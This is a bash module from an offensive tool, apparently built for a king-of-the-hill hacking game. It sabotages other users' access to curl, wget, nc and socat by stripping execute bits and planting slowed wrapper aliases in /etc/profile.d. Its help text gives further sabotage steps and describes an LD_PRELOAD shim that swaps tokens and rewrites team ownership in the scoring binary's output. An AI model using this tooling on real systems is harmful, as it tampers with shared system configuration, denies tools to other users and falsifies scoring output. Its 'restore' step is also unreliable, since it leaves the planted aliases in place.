#!/bin/bash

troll_style() {
    printf '[TROLL] %s\n' "$1"
}

troll_proc_start() {
    local host="$1"
    local path="$2"
    local tool="$3"
    local old=""

    if [ ! -e "$path" ]; then
        troll_style "${tool}: not present on ${host}, nothing to deface"
        return 1
    fi

    if [ -f "$path" ]; then
        old=$(sha1sum "$path" 2>/dev/null | cut -d' ' -f1)
    fi

    chmod o-x "$path" 2>/dev/null
    troll_style "${tool}: other-bit dropped for ${host} (sha1 ${old:-none})"

    if [ -n "$old" ]; then
        printf '%s %s %s\n' "$host" "$path" "$old" >> "$KIT/.troll_restore"
    fi
}

troll_proc_restore() {
    local line
    [ -f "$KIT/.troll_restore" ] || { troll_style "restore: nothing saved"; return 0; }
    while IFS=' ' read -r host path hash; do
        [ -n "$path" ] || continue
        if [ -f "$path" ]; then
            chmod +x "$path" 2>/dev/null
            troll_style "restore: ${path} executable again"
        fi
    done < "$KIT/.troll_restore"
    rm -f "$KIT/.troll_restore" 2>/dev/null
}

troll_touch_wrapper() {
    local dir="$1"
    local tool="$2"
    local real
    local wrapper="$dir/.t_${tool}"

    case "$tool" in
        curl) real="/usr/bin/curl" ;;
        wget) real="/usr/bin/wget" ;;
        *) real="/usr/bin/${tool}" ;;
    esac

    [ -x "$real" ] || return 0

    {
        printf '%s\n' '#!/bin/sh'
        printf '%s\n' "sleep 0.3"
        printf '%s\n' "exec ${real} \"\$@\""
    } > "$wrapper"
    chmod 755 "$wrapper" 2>/dev/null
}

troll_register_aliases() {
    local dir="$1"
    local tool
    for tool in curl wget nc ncat socat; do
        troll_touch_wrapper "$dir" "$tool"
    done
    for tool in curl wget nc socat; do
        [ -f "$dir/.t_${tool}" ] || continue
        if [ -d /etc/profile.d ] && [ ! -f "/etc/profile.d/.t_${tool}" ]; then
            printf '%s\n' "alias ${tool}='$(printf '%s' "$dir")/.t_${tool}'" > "/etc/profile.d/.t_${tool}"
            chmod 644 "/etc/profile.d/.t_${tool}" 2>/dev/null
        fi
    done
    troll_style "aliases: curl wget nc socat slowed for non-root shells"
}

troll_install_hook_help() {
    cat << 'EOF_TROLL'
MX:// TOOL SABOTAGE GUIDANCE

  curl / wget / nc / python3 / dig / jq
    chmod o-x      drop only the "other" bit so root keeps full toolset
    chmod -x       full denial (loud, obvious in a diff against the image)

  per-service vectors:
    PHP service      add disable_functions = exec,shell_exec,system,passthru,popen,proc_open
    python service   PYTHONSTARTUP=/.blackwall.rc with a sys.modules guard
    node service     edit package.json "scripts.preinstall" to a failing command

  capture-binary interposition (ring 3):
    run "strings" against the hill binary, then use -S shadow to build a preload
    arm that swaps your token in argv and rewrites team ownership in stdout.

  ring 0 hook: out of scope for a live event. A preload arm on the hill binary
  reaches the same result with a fraction of the risk.
EOF_TROLL
}

troll_help() {
    echo -e "\n${TXT_RED_PLASMA}MX:// TROLL // ECONOMIC WARFARE${NC}"
    echo -e "${TXT_VOID}──────────────────────────────────────────────────────────────────────────────${NC}"
    echo -e "${TXT_RED_SUPERNOVA}USAGE${NC}  ${TXT_CORE}./blackwall.sh -T --tool curl --host <HILL> [--restore]${NC}"
    echo -e "${TXT_RED_SUPERNOVA}SAFE${NC}   ${TXT_RED_MAGMA}only the other-bit is touched so your own root tools stay intact.${NC}"
    echo -e "${TXT_RED_SUPERNOVA}UNDO${NC}   ${TXT_RED_MAGMA}--restore replays the saved (host, path, sha1) table.${NC}"
    echo ""
    echo -e "${TXT_VOID}${ITLC}\"And instead of trying to destroy her, the king has only harmed himself.\"${NC}"
}
